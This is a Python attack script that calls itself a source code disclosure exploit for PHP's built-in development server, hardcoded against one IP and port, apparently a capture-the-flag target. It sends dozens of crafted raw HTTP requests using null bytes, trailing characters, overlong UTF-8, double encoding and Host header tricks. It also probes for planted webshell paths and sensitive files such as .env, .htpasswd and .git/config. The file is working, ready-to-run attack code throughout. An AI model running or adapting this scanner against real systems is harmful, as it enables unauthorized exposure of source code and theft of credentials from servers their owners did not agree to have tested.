#!/usr/bin/env python3
"""
PHP Built-in Development Server Source Code Disclosure Exploit
Tests various URL encoding tricks to bypass PHP execution
"""
import socket
import urllib.parse

target_host = "61.147.171.35"
target_port = 51810

def send_raw_request(request):
    """Send raw HTTP request and get response"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((target_host, target_port))
        sock.send(request)
        response = b""
        while True:
            try:
                data = sock.recv(4096)
                if not data:
                    break
                response += data
            except:
                break
        sock.close()
        return response
    except Exception as e:
        return f"Error: {e}".encode()

def test_source_disclosure():
    """Test various methods for source code disclosure"""
    
    # Different request variations to try
    requests_list = [
        # Windows-style paths (if on Windows)
        (b"GET /index.php:$DATA HTTP/1.0\r\nHost: 61.147.171.35:51810\r\n\r\n", "NTFS ADS"),
        
        # Trailing characters
        (b"GET /index.php%20 HTTP/1.0\r\n\r\n", "Trailing space"),
        (b"GET /index.php%0a HTTP/1.0\r\n\r\n", "Trailing newline"),
        (b"GET /index.php%0d HTTP/1.0\r\n\r\n", "Trailing CR"),
        (b"GET /index.php%09 HTTP/1.0\r\n\r\n", "Trailing tab"),
        (b"GET /index.php%00 HTTP/1.0\r\n\r\n", "Null byte"),
        
        # Double extensions
        (b"GET /index.php.txt HTTP/1.0\r\n\r\n", "Double ext .txt"),
        (b"GET /index.php.html HTTP/1.0\r\n\r\n", "Double ext .html"),
        (b"GET /index.php.jpg HTTP/1.0\r\n\r\n", "Double ext .jpg"),
        (b"GET /index.php%00.txt HTTP/1.0\r\n\r\n", "Null + ext"),
        
        # Unicode normalization tricks
        (b"GET /index.php\xc0\xae HTTP/1.0\r\n\r\n", "Overlong ."),
        (b"GET /\xc0\xaeindex.php HTTP/1.0\r\n\r\n", "Overlong prefix"),
        
        # Case variations (filesystem dependent)
        (b"GET /INDEX.php HTTP/1.0\r\n\r\n", "Upper case"),
        (b"GET /InDeX.pHp HTTP/1.0\r\n\r\n", "Mixed case"),
        
        # Path normalization
        (b"GET /./index.php HTTP/1.0\r\n\r\n", "Dot slash"),
        (b"GET //index.php HTTP/1.0\r\n\r\n", "Double slash"),
        (b"GET /foo/../index.php HTTP/1.0\r\n\r\n", "Parent path"),
        
        # URL encoding variations
        (b"GET /%69%6e%64%65%78%2e%70%68%70 HTTP/1.0\r\n\r\n", "Full URL encode"),
        (b"GET /%252e%252e%252f HTTP/1.0\r\n\r\n", "Double encode"),
        
        # HTTP/0.9 (no headers)
        (b"GET /index.php\r\n", "HTTP/0.9"),
        
        # Malformed HTTP
        (b"GET /index.php HTTP/1.1\r\n\r\n", "No Host header"),
        (b"GET /index.php HTTP/1.1\r\nHost: localhost\r\n\r\n", "Different host"),
        (b"GET /index.php HTTP/1.1\r\nHost: 127.0.0.1\r\n\r\n", "127.0.0.1 host"),
        
        # Request line variations
        (b"GET /index.php?source HTTP/1.0\r\n\r\n", "source param"),
        (b"GET /index.php?view-source HTTP/1.0\r\n\r\n", "view-source param"),
        (b"GET /index.php?debug HTTP/1.0\r\n\r\n", "debug param"),
        (b"GET /index.php?show HTTP/1.0\r\n\r\n", "show param"),
        
        # Special URL schemes (unlikely but worth trying)
        (b"GET view-source:/index.php HTTP/1.0\r\n\r\n", "view-source scheme"),
        (b"GET file:///var/www/html/index.php HTTP/1.0\r\n\r\n", "file scheme"),
    ]
    
    print("Testing source code disclosure methods...")
    print("=" * 60)
    
    for request, description in requests_list:
        response = send_raw_request(request)
        
        # Check if response contains PHP source code
        if b"<?php" in response or b"<?" in response:
            print(f"\n[+] SUCCESS - {description}")
            print(f"Request: {request[:50]}...")
            print(f"Response:\n{response.decode('utf-8', errors='ignore')[:1000]}")
            return True
        elif b"Hello World" not in response and b"404" not in response and b"400" not in response:
            print(f"[?] Interesting - {description}")
            print(f"    Response: {response[:200]}")
    
    return False

def test_backdoor_endpoints():
    """Test for hidden backdoor endpoints"""
    
    endpoints = [
        "/backdoor.php",
        "/shell.php", 
        "/c.php",
        "/x.php",
        "/1.php",
        "/test.php",
        "/tmp.php",
        "/uploads.php",
        "/admin.php",
        "/flag.php",
        "/secret.php",
        "/hidden.php",
        "/debug.php",
        "/info.php",
        "/phpinfo.php",
        "/.hidden.php",
        "/...php",
        "/.php",
        "/_.php",
        "/__php",
    ]
    
    print("\n" + "=" * 60)
    print("Testing hidden endpoints...")
    
    for endpoint in endpoints:
        request = f"GET {endpoint} HTTP/1.0\r\nHost: 61.147.171.35:51810\r\n\r\n".encode()
        response = send_raw_request(request)
        
        if b"Hello World" not in response and b"404" not in response:
            print(f"[?] {endpoint}: {response[:100]}")

def test_htaccess():
    """Test for .htaccess exposure"""
    
    files = [".htaccess", ".htpasswd", ".env", ".git/config", ".svn/entries", "web.config"]
    
    print("\n" + "=" * 60)
    print("Testing sensitive files...")
    
    for f in files:
        request = f"GET /{f} HTTP/1.0\r\nHost: 61.147.171.35:51810\r\n\r\n".encode()
        response = send_raw_request(request)
        
        if b"404" not in response and b"Hello World" not in response and len(response) > 100:
            print(f"[+] {f}: {response[:200]}")

if __name__ == "__main__":
    if not test_source_disclosure():
        print("\n[-] No source code disclosure found via direct methods.")
    
    test_backdoor_endpoints()
    test_htaccess()
